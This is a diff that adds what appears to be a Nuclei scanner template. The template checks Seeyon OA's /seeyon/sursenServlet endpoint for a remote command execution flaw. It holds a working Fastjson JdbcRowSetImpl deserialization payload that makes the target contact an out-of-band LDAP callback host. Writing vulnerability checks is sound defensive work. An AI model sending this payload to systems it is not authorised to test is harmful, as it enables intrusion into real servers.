@@ -1,0 +1,27 @@
+id: seeyon-oa-sursenServlet-rce
+
+info:
+  name: 致远OA /seeyon/sursenServlet 命令执行漏洞
+  author: seeyon
+  severity: high
+  
+http:
+  - raw:
+      - |
+        @timeout: 5s
+        POST /seeyon/sursenServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+
+        sursenData={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/{{randstr}}","autoCommit":"true"}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
+          - 'len(body) < 10'
+        condition: and
+
